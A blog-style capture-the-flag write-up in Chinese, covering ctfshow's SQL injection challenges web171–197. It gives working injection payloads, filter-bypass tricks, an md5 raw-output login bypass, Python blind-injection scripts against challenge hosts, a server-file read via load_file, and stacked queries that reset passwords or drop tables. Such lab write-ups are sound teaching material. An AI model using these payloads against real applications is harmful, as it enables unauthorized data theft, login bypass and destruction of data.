---
title: "ctfshow Web入门[SQL注入] web171-197 Writeup"
date: 2022-07-25T21:49:56+08:00
draft: false
author: "X1r0z"

tags: ['sqli','ctf','php']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

肝不动了.... 休息会

<!--more-->

## web171 - web173

直接查当 username=flag 时对应的 password 即可

不用查 username

## web174

```php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

对输出进行了限制, 如果有数字就显示不出来

其实是有显示位的

![20220724211659](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724211659.png)

一种思路是盲注 (要写脚本)

但还有另一种思路, 使用 `replace()` 把数字替换成字母

![20220724212136](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724212136.png)

`replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,'A'),2,'B'),3,'C'),4,'D'),5,'E'),6,'F'),7,'G'),8,'H'),9,'I'),0,'J');`

payload: `1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,'A'),2,'B'),3,'C'),4,'D'),5,'E'),6,'F'),7,'G'),8,'H'),9,'I'),0,'J'),'b' from ctfshow_user4 where username='flag' %23`

![20220724212754](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724212754.png)

替换回去后得到 flag

## web175

```php
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

`[\x00-\x7f]/i` 匹配 ASCII 码表范围内的字符

也就是说 字母 数字 符号都显示不出来了

`1' and sleep(5) %23`

猜测为时间盲注

脚本

```python
import time
import requests

dicts='1234567890-_{}qwertyuiopasdfghjklzxcvbnm'

flag = ''

for i in range(1,64):
    for s in dicts:
        sql= '1\' and if(substr((select password from ctfshow_user5 where username=\'flag\'),{},1)=\'{}\',sleep(3),0) %23'.format(i,s)
        url = 'http://d2a0c671-e4d9-4ecb-b011-90a5fc68b498.challenge.ctf.show/api/v5.php?id={}&page=1&limit=1'.format(sql)
        start_time = time.time()
        res = requests.get(url)
        stop_time = time.time()
        if stop_time - start_time >= 3:
            flag += s
            print(flag)
            break
```

![20220724215506](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724215506.png)

## web176

过滤规则没说

测试后发现可以大小写绕过, 应该是过滤了 union select 之类的关键词

![20220724220139](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724220139.png)


`1' unION SelECT 1,password,3 FroM ctfshow_user WhERe username='flag' %23`

## web177

过滤规则没说

![20220724221330](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724221330.png)

过滤空格, 使用 `/**/` 绕过

`1'/**/union/**/select/**/1,password,3/**/from/**/ctfshow_user/**/where/**/username='flag'%23`

## web178

![20220724222218](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724222218.png)

应该也是过滤空格, 但 `/**/` 已经没法绕过, `+` 也不行

测试了一下发现可以使用 `%09 %0a %0b %0c %0d %a0` 之类的字符

`1'union%09select%091,password,3%09from%09ctfshow_user%09where%09username='flag'%23`

## web179

同上, `%0c` 能绕过

`1'union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%23`

## web180

猜测也是过滤空格...

但之前的 payload 用不了了, 想了下可能是 `#` 的问题, 换成 `--[空格]` 形式的注释就能绕过去 (空格记得按上面方法替换)

`1'union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'--%0c`

## web181

```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

过滤了 ` ` `#` `file` `into` `select` 和一堆可以代替空格的字符

暂时没想出来

参考了一下网上 wp 的 payload: `-1'or(id=26)and'1`

wp 中说的是 "利用 and 的优先级比 or 更高" 来绕过

我个人的理解如下 (不知道对不对)

拼接后的 sql 语句 `select id,username,password from ctfshow_user where username != 'flag' and id='-1'or(id=26)and'1' limit 1;`

and 的优先级是高于 or 的

语句实际的执行顺序如下 (我们把距离 and 两边最近的相关操作都用括号括起来以便于理解, 并且补全空格)

`select id,username,password from ctfshow_user where (username != 'flag' and id='-1') or (id=26 and '1') limit 1;`

首先因为输出只能输出一行数据, 需要 `id=-1` 来使前一条查询纪录为空, 使得前一条包含 and 的语句为 false

然后开始判断后一个括号内的操作, `id=26 and '1'` 与 `id=26` 等价 (注意 `id=26 or '1'` 相当于查询全部内容, 因为 or 后一句永远是 true, 即查询存在的纪录)

因为前一个括号内容不成立(返回空纪录), 后一个括号内的内容成立, 于是通过 or 符号, 我们查询了 `id=26` 的纪录并显示出来

因为空格被过滤了, 所以使用 `()` 进行绕过, 测试可知 flag 所在账户的 id 值是 26, 于是构造 `or(id=26)` 来查询 id=26 的数据

最后面的 `and'1` 是闭合后面的单引号 (因为注释被过滤掉了)

最终的 payload 为 `-1'or(id=26)and'1`, 其实 `-1'or(id=26)and'1'=1` 也是可以的

## web182

同上

或者盲注

`or(id=26)and(if(ascii(substr(password,1,1))>0,sleep(5),0))and'1`

## web183

![20220724233052](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724233052.png)

仍然是过滤

from 后面的注入, 平常没怎么遇到过...

`=` 被过滤了, 用 like 替代 (regexp 应该也行)

`tableName=(ctfshow_user)where(pass)like('c%')`

括号绕过, 注意 SQL 相关的操作符例如 where like and or 是不能加括号的, 字符串和列名能加括号

这题还能用反引号代替空格绕过

```
tableName=`ctfshow_user`where`pass`like'ctfshow{%'
```

盲注脚本

```python
import requests

dicts=r'1234567890-{}qwertyuiopasdfghjklzxcvbnm'

flag = 'ctfshow{'

for i in range(1,64):
    for s in dicts:
        data = {'tableName': '(ctfshow_user)where(pass)like(\'{}%\')'.format(flag+s)}
        url = 'http://68dd6502-9f12-4e04-86da-60d7ea7d0d94.challenge.ctf.show/select-waf.php'
        res = requests.post(url,data=data)
        if res.text.find('$user_count = 1') != -1:
            flag += s
            print(flag)
            break
```

![20220724235544](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220724235544.png)

## web184

同上, 但是没有过滤空格, 过滤了 where 和单双引号

可以用 `group by + having` 绕过, 单双引号中的字符转换成十六进制

```
tableName=ctfshow_user group by pass having pass like 0xxxxxx
```

脚本

```python
import time
import requests
import binascii

dicts=r'1234567890-{}qwertyuiopasdfghjklzxcvbnm'

flag = 'ctfshow{'



def tohex(string):
    str_bin = string.encode('utf-8')
    return binascii.hexlify(str_bin).decode('utf-8')


for i in range(1,64):
    for s in dicts:
        data = {'tableName': 'ctfshow_user group by pass having pass like 0x{}'.format(tohex(flag+s+'%'))}
        url = 'http://e99073fc-5cf5-472e-9f9e-96391bdb0140.challenge.ctf.show/select-waf.php'
        res = requests.post(url,data=data)
        if res.text.find('$user_count = 1') != -1:
            flag += s
            print(flag)
            break
```

![20220725121553](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725121553.png)


网上有大佬给出 `join` 的方法, left / right join 都行, 但 inner join 不行

`tableName=ctfshow_user as a left join ctfshow_user as b on a.pass like 0xxxxx`

`tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0xxxx`

原理是 SQL 在用 left / right join 时会默认包含 left / right 表的内容, 然后在对被包含的那张表使用 on + like 进行模糊查询

使用别名的原因是两个都是 ctfshow_user 表需要区分一下, 不然会报错

## web185

差不多同上, 但过滤了 0-9 的数字

```
false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
```

用上表绕过 (我自己比较懒... 就直接用 true 一直加)

脚本写的比较乱, 主要是用 `concat() + char()` 函数配合 `true` 一直加构造 payload

注意百分号

```python
import time
import requests

flag = ['c','t','f','s','h','o','w','{']

dicts='{1234567890-qwertyuiopasdfghjklzxcvbnm}'

def tofunc(n):
    strs = ''
    for _ in range(n):
        strs += '+true'
    return 'char(' + strs + ')'

for i in range(1,64):
    for s in dicts:
        payload = flag + list(s)
        payload.append('%')
        concat_payload = 'concat(' + ','.join([tofunc(ord(x)) for x in payload]) + ')'
        data = {'tableName': 'ctfshow_user group by pass having pass like {}'.format(concat_payload)}
        url = 'http://0f317f70-eec6-43b0-bc0a-f8e0eb4bb961.challenge.ctf.show/select-waf.php'
        res = requests.post(url,data=data)
        if res.text.find('$user_count = 0') == -1:
            flag.append(s)
            print(''.join(flag))
            time.sleep(3)
            break
```

![20220725162716](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725162716.png)

## web186

同上

## web187

```php
$password = md5($_POST['password'],true);
```

网上搜了一下发现是 PHP md5 true 参数漏洞

[https://blog.csdn.net/qq_43427482/article/details/109849590](https://blog.csdn.net/qq_43427482/article/details/109849590)

上面的文章解释的比较详细, 下面简单说一下

md5 默认的加密, 即以 `md5('xxx',false)` 进行加密的时候, 输出的是32位十六进制字符串, 就是我们平时很常见的 md5 格式

而使用 `md5('xxx',true)` 进行加密时, 会在上面的基础上, 会将字符串分割成16组, 然后每组转换为二进制, 再转换为十进制, 最后通过 ASCII 码转换成字符串

![20220725170310](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725170310.png)

看到第二个参数名为 `binary` 应该就能理解了

md5 true 对 `ffifdyop` 字符串进行加密的时候, 会出现 `'or'6`, 相当于万能密码

![20220725170407](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725170407.png)

POST 提交 `username=admin&password=ffifdyop` 得到 flag

常用的两个 payload

```
ffifdyop
129581926211651571912466741651878684928
```

## web188

```php
$sql = "select pass from ctfshow_user where username = {$username}";
```

注意到这里的 username 后面没有加 ''

[https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v](https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v)

就是说当 username 的类型为 string 时, 传递 `username=0` 后, mysql 会默认把 string 转换成 int 类型

类似 PHP 的弱类型, 非数字开头的字符串 (如 admin flag 等) 转换后会变成0, 而 `0=0`, 从而可以查询到所有纪录

```php
if($row['pass']==intval($password)) }{
    ......
}
```
这里的 `$row['pass']` 很明显是字符串, 而 `intval($password)` 是整型, 根据 PHP 的弱类型漏洞, 使用 `==` 进行比较时, 非0开头的字符串会被转换成0, 所以这里 password 我们填0

`username=0&password=0`

![20220725174110](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725174110.png)

## web189

基本同上, 但过滤规则变了

hint 为 "flag在api/index.php文件中"

没想出来, 网上 wp 说是要读文件, 利用 username 为0或1时回显不同进行盲注

本来想用 substr 或者是 like, 但这里的 PHP 文件就是我们的注入点, 一股脑读出来耗时比较长而且特殊字符比较多 (比如回车 空格)

可以换成 `regexp` 正则匹配

```python
import requests

dicts='{1234567890-qwertyuiopasdfghjklzxcvbnm}'

flag = 'ctfshow{'

for i in range(1,64):
    for s in dicts:
        payload = 'if(load_file(\'/var/www/html/api/index.php\')regexp(\'{}\'),1,0)'.format(flag+s)
        res = requests.post('http://b3ec6e79-4275-45c7-96a2-1b82265538e1.challenge.ctf.show/api/index.php',data={'username':payload,'password':'1'})
        if res.text.find('67e5') != -1:
            flag += s
            print(flag)
            break
```

`regexp` 本地测试了一下发现其实不用写正则表达式, 也不用写 `%`, 例如 `{}` 这些在正则里的特殊字符也不用转义

![20220725181753](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725181753.png)

## web190

普通的布尔盲注

跑了一会发现 flag 不在 pass 里面...

pass 跑出来是 `admin`, 而且 `is_numberic()` 在这题里面不好绕过

查表

![20220725184733](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725184733.png)

查 `ctfshow_fl0g` 列名

![20220725214808](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725214808.png)

查 `f1ag` 数据

![20220725214826](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220725214826.png)

脚本

```python
import time
import requests

dicts='{0123456789qwertyuiopasdfghjklzxcvbnm-_,}'

flag = ''

for i in range(1,64):
    for s in dicts:
        #payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        #payload = 'select group_concat(column_name) from information_schema.columns where table_name=\'ctfshow_fl0g\' and table_schema=database()'
        payload = 'select f1ag from ctfshow_fl0g'
        t_payload = 'admin\' and if(substr(({}),{},1)=\'{}\',1,0)#'.format(payload,i,s)
        res = requests.post('http://3094f582-d700-4861-bdb7-ad89b2b8efc0.challenge.ctf.show/api/index.php',data={'username':t_payload,'password':'1'})
        if res.text.find('5bc6') != -1:
            flag += s
            print(flag)
            time.sleep(2)
            break
```

## web191

同上, 但是 `ascii()` 被过滤了

不过自己的脚本一直没怎么用二分法...

脚本同上

## web192

同上, 又过滤了 `ord()` `hex()`

脚本同上

## web193

同上, 过滤了 `substr()`

改成 `mid()` 即可

表名换成了 `ctfshow_flxg`

## web194

同上, 又过滤了 `substring()` `char()` `left right`

脚本同上, 用 `mid()` 绕过

## web195

mysql 堆叠注入

堆叠注入就是指可以执行多条 SQL 语句, 其原理是使用了 `mysql_multi_query()` 来执行语句

`mysql_multi_query()`可以多句执行, 而 `mysql_query()` 不能多句执行

思路就是通过 update 更新登录账号的密码

试了一下 update 好像不能用括号, 本地测试失败了

但是能用反引号 (加在表名和列名两侧)

```sql
0;update`ctfshow_user`set`pass`=1
```

之后把用户名改成0 (原理上面说过, mysql 的弱类型转换, 0可以匹配任意一条记录), 密码改成1登录即可

## web196

死活想不出来

但是网上 wp 用的是 `1;select(1)`

按照提示来说 select 应该已经被过滤了, 无语...

payload 的原理就是执行 `select(1)` 使记录返回1

所以前面的 select pass 就被顶掉了

如果不是堆叠注入的话, 需要让前面报错 (即查不到结果), 这样才能返回 union 后的查询内容

## web197

hint 为 "用户名可以很长"

没有过滤空格, 过滤了 select (这次是真过滤了), 另外 update 也被过滤了

根据 hint 的提示来说, 我们可以对数据表进行 drop create 操作

`1;drop table ctfshow_user;create table ctfshow_user(username varchar(255),pass varchar(255));insert ctfshow_user values(1,1)`

insert 操作可以不加 `into`